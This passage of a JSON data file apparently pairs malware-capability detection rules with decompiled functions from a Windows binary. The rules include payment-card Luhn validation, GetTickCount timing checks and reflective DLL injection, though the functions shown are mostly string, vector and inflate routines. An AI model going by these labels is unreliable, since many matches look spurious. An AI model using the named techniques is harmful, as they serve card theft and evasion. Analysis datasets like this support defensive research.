            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408f80(uint *param_1)\n\n{\n    if (0xf < param_1[5]) {\n        fcn.0042d62b(*param_1);\n    }\n    param_1[5] = 0xf;\n    param_1[4] = 0;\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 83
    },
    "00408ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408ff0(void)\n\n{\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    \n    if (unaff_ESI != unaff_EDI) {\n        if (0xf < unaff_ESI[5]) {\n            fcn.0042d62b(*unaff_ESI);\n        }\n        unaff_ESI[5] = 0xf;\n        unaff_ESI[4] = 0;\n        *unaff_ESI = 0;\n        if (unaff_EDI[5] < 0x10) {\n            fcn.0042d8e0(unaff_ESI, unaff_EDI, unaff_EDI[4] + 1);\n        }\n        else {\n            *unaff_ESI = *unaff_EDI;\n            *unaff_EDI = 0;\n        }\n        unaff_ESI[4] = unaff_EDI[4];\n        unaff_ESI[5] = unaff_EDI[5];\n        unaff_EDI[4] = 0;\n        unaff_EDI[5] = 0;\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "004090e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004090e0(int32_t **arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **in_ECX;\n    \n    if (arg_8h != NULL) {\n        piVar1 = in_ECX[5];\n        ppiVar2 = in_ECX;\n        if (0xf < piVar1) {\n            ppiVar2 = *in_ECX;\n        }\n        if (ppiVar2 <= arg_8h) {\n            ppiVar2 = in_ECX;\n            if (0xf < piVar1) {\n                ppiVar2 = *in_ECX;\n            }\n            if (arg_8h < in_ECX[4] + ppiVar2) {\n                if (0xf < piVar1) {\n                    fcn.004092e0(in_ECX, arg_8h - *in_ECX, arg_ch);\n                    return;\n                }\n                fcn.004092e0(in_ECX, arg_8h - in_ECX, arg_ch);\n                return;\n            }\n        }\n    }\n    if (arg_ch == 0xffffffff) {\n        fcn.0042cb30(\"string too long\");\n    }\n    if (in_ECX[5] < arg_ch) {\n        fcn.00409570(arg_ch, in_ECX[4]);\n        if (arg_ch == NULL) {\n            return;\n        }\n    }\n    else if (arg_ch == NULL) {\n        in_ECX[4] = NULL;\n        if (0xf < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    ppiVar2 = in_ECX;\n    if (0xf < in_ECX[5]) {\n        ppiVar2 = *in_ECX;\n    }\n    fcn.0042f700(ppiVar2, arg_8h, arg_ch);\n    in_ECX[4] = arg_ch;\n    if (in_ECX[5] < 0x10) {\n        *(in_ECX + arg_ch) = 0;\n        return;\n    }\n    *(*in_ECX + arg_ch) = 0;\n    return;\n}\n",
        "token_count": 505
    },
    "004091e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004091e0(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4419e0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    if (0x3c3c3c3 < var_8h) {\n        fcn.0042cb30(\"vector<T> too long\");\n    }\n    if ((param_1[2] - *param_1) / 0x44 < var_8h) {\n        iVar3 = fcn.00409480();\n        var_4h = 0;\n        fcn.00409c30(param_1[1], iVar3, var_8h);\n        iVar1 = param_1[1];\n        iVar2 = *param_1;\n        if (iVar2 != 0) {\n            fcn.00409bd0(var_8h);\n            fcn.0042d62b(*param_1);\n        }\n        param_1[2] = iVar3 + var_8h * 0x44;\n        param_1[1] = iVar3 + ((iVar1 - iVar2) / 0x44) * 0x44;\n        *param_1 = iVar3;\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 395
    },
    "004092e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004092e0(int32_t **arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t **arg_8h_00;\n    int32_t **in_ECX;\n    int32_t **extraout_ECX;\n    int32_t **extraout_ECX_00;\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    \n    piVar2 = arg_8h[4];\n    ppiVar1 = arg_8h;\n    if (piVar2 < arg_ch) {\n        fcn.0042cb7d(\"invalid string position\");\n        ppiVar1 = extraout_ECX;\n    }\n    piVar2 = piVar2 - arg_ch;\n    if (arg_10h < piVar2) {\n        piVar2 = arg_10h;\n    }\n    if (in_ECX == ppiVar1) {\n        fcn.004094e0(piVar2 + arg_ch, 0xffffffff);\n        fcn.004094e0(0, arg_ch);\n        return;\n    }\n    if (piVar2 == 0xffffffff) {\n        fcn.0042cb30(\"string too long\");\n        ppiVar1 = extraout_ECX_00;\n    }\n    if (in_ECX[5] < piVar2) {\n        fcn.00409570(piVar2, in_ECX[4]);\n        ppiVar1 = arg_8h;\n        if (piVar2 == NULL) {\n            return;\n        }\n    }\n    else if (piVar2 == NULL) {\n        in_ECX[4] = NULL;\n        if (0xf < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    if (0xf < ppiVar1[5]) {\n        ppiVar1 = *ppiVar1;\n    }\n    arg_8h_00 = in_ECX;\n    if (0xf < in_ECX[5]) {\n        arg_8h_00 = *in_ECX;\n    }\n    fcn.0042f700(arg_8h_00, ppiVar1 + arg_ch, piVar2);\n    in_ECX[4] = piVar2;\n    if (in_ECX[5] < 0x10) {\n        *(in_ECX + piVar2) = 0;\n        return;\n    }\n    *(*in_ECX + piVar2) = 0;\n    return;\n}\n",
        "token_count": 569
    },
    "00409480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409480(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    code *var_10h;\n    uint var_4h;\n    \n    iVar1 = 0;\n    if (param_1 != 0) {\n        if ((param_1 < 0x3c3c3c4) && (iVar1 = fcn.0042ddfe(param_1 * 0x44),  iVar1 != 0)) {\n            return iVar1;\n        }\n        var_4h = 0;\n        fcn.0042d7ec(&var_4h);\n        var_10h = vtable.std::bad_alloc.0;\n        iVar1 = fcn.0042f5f6(&var_10h, 0x4510e8);\n    }\n    return iVar1;\n}\n",
        "token_count": 189
    },
    "004094e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004094e0(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t **in_ECX;\n    int32_t *extraout_ECX;\n    int32_t **ppiVar4;\n    \n    piVar2 = in_ECX[4];\n    if (piVar2 < arg_8h) {\n        piVar2 = fcn.0042cb7d(\"invalid string position\");\n        arg_8h = extraout_ECX;\n    }\n    uVar3 = piVar2 - arg_8h;\n    if (uVar3 < arg_ch) {\n        arg_ch = uVar3;\n    }\n    if (arg_ch != 0) {\n        ppiVar4 = in_ECX;\n        ppiVar1 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar4 = *in_ECX;\n            ppiVar1 = *in_ECX;\n        }\n        fcn.0042d8e0(ppiVar4 + arg_8h, ppiVar1 + arg_8h + arg_ch, uVar3 - arg_ch);\n        piVar2 = in_ECX[4] - arg_ch;\n        in_ECX[4] = piVar2;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar2) = 0;\n            return;\n        }\n        *(in_ECX + piVar2) = 0;\n    }\n    return;\n}\n",
        "token_count": 357
    },
    "00409730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409730(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EDX;\n    \n    fcn.0042dd82(in_EDX, 0x400, arg_8h, &arg_ch);\n    return;\n}\n",
        "token_count": 58
    },
    "00409840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409840(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t **ppiVar3;\n    uint32_t uVar4;\n    int32_t **unaff_ESI;\n    ulong uVar5;\n    \n    uVar2 = arg_8h[4];\n    uVar4 = arg_ch;\n    if (uVar2 < arg_ch) {\n        uVar5 = fcn.0042cb7d(\"invalid string position\");\n        uVar4 = uVar5 >> 0x20;\n        uVar2 = uVar5;\n    }\n    if (uVar2 - uVar4 < in_EAX) {\n        in_EAX = uVar2 - uVar4;\n    }\n    uVar5 = CONCAT44(uVar4, unaff_ESI[4]);\n    if (-unaff_ESI[4] - 1U <= in_EAX) {\n        uVar5 = fcn.0042cb30(\"string too long\");\n    }\n    if (in_EAX != 0) {\n        piVar1 = uVar5 + in_EAX;\n        if (piVar1 == 0xffffffff) {\n            uVar5 = fcn.0042cb30(\"string too long\");\n        }\n        uVar2 = uVar5 >> 0x20;\n        if (unaff_ESI[5] < piVar1) {\n            fcn.00409570(piVar1, uVar5);\n            uVar2 = arg_ch;\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            unaff_ESI[4] = NULL;\n            if (0xf < unaff_ESI[5]) {\n                **unaff_ESI = 0;\n                return;\n            }\n            *unaff_ESI = 0;\n            return;\n        }\n        if (0xf < arg_8h[5]) {\n            arg_8h = *arg_8h;\n        }\n        ppiVar3 = unaff_ESI;\n        if (0xf < unaff_ESI[5]) {\n            ppiVar3 = *unaff_ESI;\n        }\n        fcn.0042f700(unaff_ESI[4] + ppiVar3, arg_8h + uVar2, in_EAX);\n        unaff_ESI[4] = piVar1;\n        if (0xf < unaff_ESI[5]) {\n            *(*unaff_ESI + piVar1) = 0;\n            return;\n        }\n        *(unaff_ESI + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 605
    },
    "00409930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409930(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t **ppiVar5;\n    int32_t **ppiVar6;\n    int32_t **unaff_EBX;\n    int32_t **unaff_ESI;\n    ulong uVar7;\n    uint var_4h;\n    \n    if (unaff_EBX[4] < arg_8h) {\n        fcn.0042cb7d(\"invalid string position\");\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    uVar3 = unaff_EBX[4] - arg_8h;\n    if (uVar3 < in_EAX) {\n        in_EAX = uVar3;\n    }\n    piVar4 = unaff_ESI[4];\n    if (-piVar4 - 1U <= in_EAX) {\n        piVar4 = fcn.0042cb30(\"string too long\");\n    }\n    if (in_EAX != 0) {\n        piVar1 = piVar4 + in_EAX;\n        uVar7 = CONCAT44(piVar1, piVar4);\n        if (piVar1 == 0xffffffff) {\n            uVar7 = fcn.0042cb30(\"string too long\");\n        }\n        piVar4 = uVar7 >> 0x20;\n        if (unaff_ESI[5] < piVar4) {\n            fcn.00409570(piVar4, uVar7);\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar4 == NULL) {\n            unaff_ESI[4] = NULL;\n            if (unaff_ESI[5] < 0x10) {\n                *unaff_ESI = 0;\n                return;\n            }\n            **unaff_ESI = 0;\n            return;\n        }\n        ppiVar5 = unaff_ESI;\n        ppiVar6 = unaff_ESI;\n        if (0xf < unaff_ESI[5]) {\n            ppiVar5 = *unaff_ESI;\n            ppiVar6 = *unaff_ESI;\n        }\n        fcn.0042d8e0(ppiVar5 + in_EAX, ppiVar6, unaff_ESI[4]);\n        if (unaff_ESI == unaff_EBX) {\n            if (arg_8h != NULL) {\n                arg_8h = arg_8h + in_EAX;\n            }\n            if (unaff_ESI[5] < 0x10) {\n                fcn.0042d8e0(unaff_ESI, unaff_ESI + arg_8h, in_EAX);\n            }\n            else {\n                fcn.0042d8e0(*unaff_ESI, *unaff_ESI + arg_8h, in_EAX);\n            }\n        }\n        else {\n            if (0xf < unaff_EBX[5]) {\n                unaff_EBX = *unaff_EBX;\n            }\n            ppiVar6 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                ppiVar6 = *unaff_ESI;\n            }\n            fcn.0042f700(ppiVar6, unaff_EBX + arg_8h, in_EAX);\n        }\n        unaff_ESI[4] = piVar1;\n        if (0xf < unaff_ESI[5]) {\n            *(*unaff_ESI + piVar1) = 0;\n            return;\n        }\n        *(unaff_ESI + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 840
    },
    "00409a90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409a90(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t **ppiVar4;\n    int32_t **in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    \n    if (in_EAX != NULL) {\n        piVar2 = in_ECX[5];\n        ppiVar4 = in_ECX;\n        if (0xf < piVar2) {\n            ppiVar4 = *in_ECX;\n        }\n        if (ppiVar4 <= in_EAX) {\n            ppiVar4 = in_ECX;\n            if (0xf < piVar2) {\n                ppiVar4 = *in_ECX;\n            }\n            if (in_EAX < in_ECX[4] + ppiVar4) {\n                if (piVar2 < 0x10) {\n                    fcn.00409930(in_EAX - in_ECX);\n                    return;\n                }\n                fcn.00409930(in_EAX - *in_ECX);\n                return;\n            }\n        }\n    }\n    piVar2 = in_ECX[4];\n    uVar5 = arg_8h;\n    if (-piVar2 - 1U <= arg_8h) {\n        piVar2 = fcn.0042cb30(\"string too long\");\n        uVar5 = extraout_ECX;\n    }\n    if (uVar5 != 0) {\n        piVar1 = piVar2 + uVar5;\n        if (piVar1 == 0xffffffff) {\n            piVar2 = fcn.0042cb30(\"string too long\");\n        }\n        if (in_ECX[5] < piVar1) {\n            fcn.00409570(piVar1, piVar2);\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            in_ECX[4] = NULL;\n            if (in_ECX[5] < 0x10) {\n                *in_ECX = 0;\n                return;\n            }\n            **in_ECX = 0;\n            return;\n        }\n        ppiVar3 = in_ECX;\n        ppiVar4 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar3 = *in_ECX;\n            ppiVar4 = *in_ECX;\n        }\n        fcn.0042d8e0(ppiVar3 + arg_8h, ppiVar4, in_ECX[4]);\n        ppiVar4 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar4 = *in_ECX;\n        }\n        fcn.0042f700(ppiVar4, in_EAX, arg_8h);\n        in_ECX[4] = piVar1;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar1) = 0;\n            return;\n        }\n        *(in_ECX + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 713
    },
    "00409bd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00409bd0(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t *in_EAX;\n    uint32_t *puVar2;\n    uint32_t *unaff_EDI;\n    \n    if (in_EAX != unaff_EDI) {\n        puVar2 = in_EAX + 0xd;\n        do {\n            if (0xf < *puVar2) {\n                fcn.0042d62b(puVar2[-5]);\n            }\n            *puVar2 = 0xf;\n            puVar2[-1] = 0;\n            *(puVar2 + -5) = 0;\n            if (0xf < puVar2[-7]) {\n                fcn.0042d62b(puVar2[-0xc]);\n            }\n            puVar2[-7] = 0xf;\n            puVar2[-8] = 0;\n            *(puVar2 + -0xc) = 0;\n            puVar1 = puVar2 + 4;\n            puVar2 = puVar2 + 0x11;\n        } while (puVar1 != unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "00409c30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __thiscall fcn.00409c30(uint *param_1, uint *param_2, uint *param_3)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *var_8h;\n    uint *var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4419bc;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    var_4h._1_3_ = 0;\n    for (; param_1 != var_8h; param_1 = param_1 + 0x11) {\n        var_4h._0_1_ = 1;\n        if (var_ch_2 != NULL) {\n            *var_ch_2 = *param_1;\n            var_ch_2[6] = 0xf;\n            var_ch_2[5] = 0;\n            *(var_ch_2 + 1) = 0;\n            fcn.004092e0(param_1 + 1, 0, 0xffffffff);\n            var_4h._0_1_ = 2;\n            var_ch_2[0xd] = 0xf;\n            var_ch_2[0xc] = 0;\n            *(var_ch_2 + 8) = 0;\n            fcn.004092e0(param_1 + 8, 0, 0xffffffff);\n            var_ch_2[0xf] = param_1[0xf];\n            var_ch_2[0x10] = param_1[0x10];\n        }\n        var_ch_2 = var_ch_2 + 0x11;\n    }\n    *in_FS_OFFSET = var_ch_3;\n    return var_ch_2;\n}\n",
        "token_count": 441
    },
    "00409d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00409d10(void)\n\n{\n    int32_t unaff_ESI;\n    \n    if (0xf < *(unaff_ESI + 0x34)) {\n        fcn.0042d62b(*(unaff_ESI + 0x20));\n    }\n    *(unaff_ESI + 0x34) = 0xf;\n    *(unaff_ESI + 0x30) = 0;\n    *(unaff_ESI + 0x20) = 0;\n    if (0xf < *(unaff_ESI + 0x18)) {\n        fcn.0042d62b(*(unaff_ESI + 4));\n    }\n    *(unaff_ESI + 0x14) = 0;\n    *(unaff_ESI + 0x18) = 0xf;\n    *(unaff_ESI + 4) = 0;\n    return;\n}\n",
        "token_count": 200
    },
    "00409d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409d60(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint32_t arg_ch;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint32_t uVar2;\n    uint32_t arg_10h;\n    uint32_t uVar3;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = *(unaff_EBX + 0xc);\n    uVar2 = *(unaff_ESI + 0x34);\n    arg_ch = *(unaff_ESI + 0x30);\n    if (uVar2 < arg_ch) {\n        uVar2 = *(unaff_ESI + 0x2c);\n    }\n    uVar3 = *(unaff_EBX + 0x10);\n    arg_10h = uVar2 - arg_ch;\n    if (uVar3 < uVar2 - arg_ch) {\n        arg_10h = uVar3;\n    }\n    if ((arg_10h != 0) && (arg_8h == -5)) {\n        arg_8h = 0;\n    }\n    *(unaff_EBX + 0x14) = *(unaff_EBX + 0x14) + arg_10h;\n    *(unaff_EBX + 0x10) = uVar3 - arg_10h;\n    if (*(unaff_ESI + 0x38) != NULL) {\n        uVar1 = (**(unaff_ESI + 0x38))(*(unaff_ESI + 0x3c), arg_ch, arg_10h);\n        *(unaff_ESI + 0x3c) = uVar1;\n        *(unaff_EBX + 0x30) = uVar1;\n    }\n    if (arg_10h != 0) {\n        fcn.0042f700(var_8h, arg_ch, arg_10h);\n        var_8h = var_8h + arg_10h;\n        arg_ch = arg_ch + arg_10h;\n    }\n    if (arg_ch == *(unaff_ESI + 0x2c)) {\n        arg_ch = *(unaff_ESI + 0x28);\n        if (*(unaff_ESI + 0x34) == *(unaff_ESI + 0x2c)) {\n            *(unaff_ESI + 0x34) = arg_ch;\n        }\n        uVar2 = *(unaff_EBX + 0x10);\n        uVar3 = *(unaff_ESI + 0x34) - arg_ch;\n        if (uVar2 < uVar3) {\n            uVar3 = uVar2;\n        }\n        if ((uVar3 != 0) && (arg_8h == -5)) {\n            arg_8h = 0;\n        }\n        *(unaff_EBX + 0x14) = *(unaff_EBX + 0x14) + uVar3;\n        *(unaff_EBX + 0x10) = uVar2 - uVar3;\n        if (*(unaff_ESI + 0x38) != NULL) {\n            uVar1 = (**(unaff_ESI + 0x38))(*(unaff_ESI + 0x3c), arg_ch, uVar3);\n            *(unaff_ESI + 0x3c) = uVar1;\n            *(unaff_EBX + 0x30) = uVar1;\n        }\n        if (uVar3 != 0) {\n            fcn.0042f700(var_8h, arg_ch, uVar3);\n            var_8h = var_8h + uVar3;\n            arg_ch = arg_ch + uVar3;\n        }\n    }\n    *(unaff_EBX + 0xc) = var_8h;\n    *(unaff_ESI + 0x30) = arg_ch;\n    return arg_8h;\n}\n",
        "token_count": 879
    },
    "00409e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409e60(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    puVar1 = (**(in_EAX + 0x20))(*(in_EAX + 0x28), 1, 0x1c);\n    if (puVar1 != NULL) {\n        *(puVar1 + 4) = arg_8h;\n        *(puVar1 + 0x11) = arg_ch;\n        *puVar1 = 0;\n        puVar1[5] = arg_10h;\n        puVar1[6] = arg_14h;\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "0040a570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040a570(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    \n    puVar1 = (**(in_EAX + 0x20))(*(in_EAX + 0x28), 1, 0x40);\n    if (puVar1 != NULL) {\n        iVar2 = (**(in_EAX + 0x20))(*(in_EAX + 0x28), 8, 0x5a0);\n        puVar1[9] = iVar2;\n        if (iVar2 != 0) {\n            iVar2 = (**(in_EAX + 0x20))(*(in_EAX + 0x28), 1);\n            puVar1[10] = iVar2;\n            if (iVar2 == 0) {\n                (**(in_EAX + 0x24))(*(in_EAX + 0x28), puVar1[9]);\n                (**(in_EAX + 0x24))(*(in_EAX + 0x28), puVar1);\n                return NULL;\n            }\n            puVar1[0xb] = iVar2 + unaff_EBX;\n            puVar1[0xe] = arg_8h;\n            *puVar1 = 0;\n            fcn.0040a500();\n            return puVar1;\n        }\n        (**(in_EAX + 0x24))(*(in_EAX + 0x28), puVar1);\n    }\n    return NULL;\n}\n",
        "token_count": 350
    },
    "0040b620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040b620(uint32_t arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, int32_t *arg_18h, uint arg_1ch, uint arg_20h\n            , uint arg_24h)\n\n{\n    int32_t arg_24h_00;\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    uint var_4h;\n    \n    arg_24h_00 = (**(unaff_EBX + 0x20))(*(unaff_EBX + 0x28), 0x120, 4);\n    if (arg_24h_00 == 0) {\n        return -4;\n    }\n    iVar1 = fcn.0040b050(arg_8h, 0x101, 0x44e200, 0x44e280, arg_1ch, arg_14h, arg_24h, arg_24h_00);\n    if (iVar1 == 0) {\n        if (*arg_14h != 0) {\n            iVar1 = fcn.0040b050(arg_ch, 0, 0x44e300, 0x44e378, arg_20h, arg_18h, arg_24h, arg_24h_00);\n            if (iVar1 == 0) {\n                if ((*arg_18h != 0) || (arg_8h < 0x102)) {\n                    (**(unaff_EBX + 0x24))(*(unaff_EBX + 0x28), arg_24h_00);\n                    return 0;\n                }\n            }\n            else {\n                if (iVar1 == -3) {\n                    *(unaff_EBX + 0x18) = \"oversubscribed distance tree\";\n                    (**(unaff_EBX + 0x24))(*(unaff_EBX + 0x28), arg_24h_00);\n                    return -3;\n                }\n                if (iVar1 == -5) {\n                    